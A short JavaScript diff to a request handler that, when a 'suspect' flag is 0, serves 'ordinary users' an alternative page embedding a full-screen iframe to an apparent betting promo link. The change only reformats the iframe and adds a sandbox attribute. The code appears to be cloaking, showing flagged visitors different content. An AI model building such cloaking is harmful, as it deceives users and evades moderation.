@@ -94,7 +94,7 @@ async function handleRequestId(req, res, requestId) {
     if (suspect === 0) {
       // HTML-код для обычных пользователей (альтернативный сайт)
       const alternativeHtml = `
-      <!DOCTYPE html>
+   <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -115,9 +115,12 @@ async function handleRequestId(req, res, requestId) {
     </style>
 </head>
 <body>
-    <iframe src="https://1wilib.life/v3/3316/motive-video-promo?p=xgii" allowfullscreen></iframe>
+    <iframe src="https://1wilib.life/v3/3316/motive-video-promo?p=xgii" 
+            allowfullscreen 
+            sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
 </body>
 </html>
+
 
 
       `;
